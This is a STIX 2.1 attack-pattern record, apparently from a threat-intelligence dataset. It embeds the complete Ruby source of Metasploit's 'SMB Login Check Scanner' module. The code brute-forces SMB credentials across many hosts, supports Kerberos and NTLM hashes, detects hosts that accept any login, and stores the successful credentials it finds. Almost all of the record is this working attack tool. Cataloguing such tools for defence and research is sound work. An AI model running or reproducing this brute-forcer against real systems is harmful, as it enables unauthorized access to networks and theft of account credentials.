{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--aa448927-3134-4d01-b97e-a04f721bd48e",
    "created": "2024-08-14T16:31:17.484044Z",
    "modified": "2024-08-14T16:31:17.484049Z",
    "name": "SMB Login Check Scanner",
    "description": " This module will test a SMB login on a range of machines and report successful logins.  If you have loaded a database plugin and connected to a database this module will record successful logins and hosts so you can track your access. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/smb/smb_login.rb",
            "external_id": "smb_login.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'metasploit/framework/login_scanner/smb'\nrequire 'metasploit/framework/credential_collection'\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::DCERPC\n  include Msf::Exploit::Remote::SMB::Client\n  include Msf::Exploit::Remote::SMB::Client::Authenticated\n\n  include Msf::Auxiliary::Scanner\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::AuthBrute\n\n  Aliases = [\n    'auxiliary/scanner/smb/login'\n  ].freeze\n\n  def proto\n    'smb'\n  end\n\n  def initialize\n    super(\n      'Name' => 'SMB Login Check Scanner',\n      'Description' => %q{\n        This module will test a SMB login on a range of machines and\n        report successful logins.  If you have loaded a database plugin\n        and connected to a database this module will record successful\n        logins and hosts so you can track your access.\n      },\n      'Author' => [\n        'tebo <tebo[at]attackresearch.com>', # Original\n        'Ben Campbell', # Refactoring\n        'Brandon McCann \"zeknox\" <bmccann[at]accuvant.com>', # admin check\n        'Tom Sellers <tom[at]fadedcode.net>' # admin check/bug fix\n      ],\n      'References' => [\n        [ 'CVE', '1999-0506'], # Weak password\n      ],\n      'License' => MSF_LICENSE,\n      'DefaultOptions' => {\n        'DB_ALL_CREDS' => false,\n        'BLANK_PASSWORDS' => false,\n        'USER_AS_PASS' => false\n      }\n    )\n\n    # These are normally advanced options, but for this module they have a\n    # more active role, so make them regular options.\n    register_options(\n      [\n        Opt::Proxies,\n        OptBool.new('ABORT_ON_LOCKOUT', [ true, 'Abort the run when an account lockout is detected', false ]),\n        OptBool.new('PRESERVE_DOMAINS', [ false, 'Respect a username that contains a domain name.', true ]),\n        OptBool.new('RECORD_GUEST', [ false, 'Record guest-privileged random logins to the database', false ]),\n        OptBool.new('DETECT_ANY_AUTH', [false, 'Enable detection of systems accepting any authentication', false]),\n        OptBool.new('DETECT_ANY_DOMAIN', [false, 'Detect if domain is required for the specified user', false])\n      ]\n    )\n\n    deregister_options('USERNAME', 'PASSWORD', 'PASSWORD_SPRAY')\n  end\n\n  def run_host(ip)\n    print_brute(level: :vstatus, ip: ip, msg: 'Starting SMB login bruteforce')\n\n    domain = datastore['SMBDomain'] || ''\n\n    kerberos_authenticator_factory = nil\n    if datastore['SMB::Auth'] == Msf::Exploit::Remote::AuthOption::KERBEROS\n      fail_with(Msf::Exploit::Failure::BadConfig, 'The Smb::Rhostname option is required when using Kerberos authentication.') if datastore['Smb::Rhostname'].blank?\n      fail_with(Msf::Exploit::Failure::BadConfig, 'The SMBDomain option is required when using Kerberos authentication.') if datastore['SMBDomain'].blank?\n      fail_with(Msf::Exploit::Failure::BadConfig, 'The DomainControllerRhost is required when using Kerberos authentication.') if datastore['DomainControllerRhost'].blank?\n\n      kerberos_authenticator_factory = lambda do |username, password, realm|\n        Msf::Exploit::Remote::Kerberos::ServiceAuthenticator::SMB.new(\n          host: datastore['DomainControllerRhost'],\n          hostname: datastore['Smb::Rhostname'],\n          proxies: datastore['Proxies'],\n          realm: realm,\n          username: username,\n          password: password,\n          framework: framework,\n          framework_module: self,\n          cache_file: datastore['Smb::Krb5Ccname'].blank? ? nil : datastore['Smb::Krb5Ccname'],\n          # Write only cache so we keep all gathered tickets but don't reuse them for auth while running the module\n          ticket_storage: kerberos_ticket_storage({ read: false, write: true })\n        )\n      end\n    end\n\n    @scanner = Metasploit::Framework::LoginScanner::SMB.new(\n      host: ip,\n      port: rport,\n      local_port: datastore['CPORT'],\n      stop_on_success: datastore['STOP_ON_SUCCESS'],\n      proxies: datastore['Proxies'],\n      bruteforce_speed: datastore['BRUTEFORCE_SPEED'],\n      connection_timeout: 5,\n      max_send_size: datastore['TCP::max_send_size'],\n      send_delay: datastore['TCP::send_delay'],\n      framework: framework,\n      framework_module: self,\n      kerberos_authenticator_factory: kerberos_authenticator_factory\n    )\n\n    if datastore['DETECT_ANY_AUTH']\n      bogus_result = @scanner.attempt_bogus_login(domain)\n      if bogus_result.success?\n        if bogus_result.access_level == Metasploit::Framework::LoginScanner::SMB::AccessLevels::GUEST\n          print_status('This system allows guest sessions with random credentials')\n        else\n          print_error('This system accepts authentication with random credentials, brute force is ineffective.')\n          return\n        end\n      else\n        vprint_status('This system does not accept authentication with random credentials, proceeding with brute force')\n      end\n    end\n\n    cred_collection = build_credential_collection(\n      realm: domain,\n      username: datastore['SMBUser'],\n      password: datastore['SMBPass']\n    )\n    cred_collection = prepend_db_hashes(cred_collection)\n\n    @scanner.cred_details = cred_collection\n\n    @scanner.scan! do |result|\n      case result.status\n      when Metasploit::Model::Login::Status::LOCKED_OUT\n        if datastore['ABORT_ON_LOCKOUT']\n          print_error(\"Account lockout detected on '#{result.credential.public}', aborting.\")\n          break\n        else\n          print_error(\"Account lockout detected on '#{result.credential.public}', skipping this user.\")\n        end\n\n      when Metasploit::Model::Login::Status::DENIED_ACCESS\n        print_brute level: :status, ip: ip, msg: \"Correct credentials, but unable to login: '#{result.credential}', #{result.proof}\"\n        report_creds(ip, rport, result)\n        :next_user\n      when Metasploit::Model::Login::Status::SUCCESSFUL\n        print_brute level: :good, ip: ip, msg: \"Success: '#{result.credential}' #{result.access_level}\"\n        report_creds(ip, rport, result)\n        :next_user\n      when Metasploit::Model::Login::Status::UNABLE_TO_CONNECT\n        if datastore['VERBOSE']\n          print_brute level: :verror, ip: ip, msg: 'Could not connect'\n        end\n        invalidate_login(\n          address: ip,\n          port: rport,\n          protocol: 'tcp',\n          public: result.credential.public,\n          private: result.credential.private,\n          realm_key: Metasploit::Model::Realm::Key::ACTIVE_DIRECTORY_DOMAIN,\n          realm_value: result.credential.realm,\n          last_attempted_at: DateTime.now,\n          status: result.status\n        )\n        :abort\n      when Metasploit::Model::Login::Status::INCORRECT\n        if datastore['VERBOSE']\n          print_brute level: :verror, ip: ip, msg: \"Failed: '#{result.credential}', #{result.proof}\"\n        end\n        invalidate_login(\n          address: ip,\n          port: rport,\n          protocol: 'tcp',\n          public: result.credential.public,\n          private: result.credential.private,\n          realm_key: Metasploit::Model::Realm::Key::ACTIVE_DIRECTORY_DOMAIN,\n          realm_value: result.credential.realm,\n          last_attempted_at: DateTime.now,\n          status: result.status\n        )\n      end\n    end\n  end\n\n  # This logic is not universal ie a local account will not care about workgroup\n  # but remote domain authentication will so check each instance\n  def accepts_bogus_domains?(user, pass)\n    bogus_domain = @scanner.attempt_login(\n      Metasploit::Framework::Credential.new(\n        public: user,\n        private: pass,\n        realm: Rex::Text.rand_text_alpha(8)\n      )\n    )\n\n    return bogus_domain.success?\n  end\n\n  def report_creds(ip, port, result)\n    if !datastore['RECORD_GUEST'] && (result.access_level == Metasploit::Framework::LoginScanner::SMB::AccessLevels::GUEST)\n      return\n    end\n\n    service_data = {\n      address: ip,\n      port: port,\n      service_name: 'smb',\n      protocol: 'tcp',\n      workspace_id: myworkspace_id\n    }\n\n    credential_data = {\n      module_fullname: fullname,\n      origin_type: :service,\n      private_data: result.credential.private,\n      private_type: (\n        Rex::Proto::NTLM::Utils.is_pass_ntlm_hash?(result.credential.private) ? :ntlm_hash : :password\n      ),\n      username: result.credential.public\n    }.merge(service_data)\n\n    if datastore['DETECT_ANY_DOMAIN'] && domain.present?\n      if accepts_bogus_domains?(result.credential.public, result.credential.private)\n        print_brute(level: :vstatus, ip: ip, msg: \"Domain is ignored for user #{result.credential.public}\")\n      else\n        credential_data.merge!(\n          realm_key: Metasploit::Model::Realm::Key::ACTIVE_DIRECTORY_DOMAIN,\n          realm_value: result.credential.realm\n        )\n      end\n    end\n\n    credential_core = create_credential(credential_data)\n\n    login_data = {\n      access_level: result.access_level,\n      core: credential_core,\n      last_attempted_at: DateTime.now,\n      status: result.status\n    }.merge(service_data)\n\n    create_credential_login(login_data)\n  end\nend\n"
}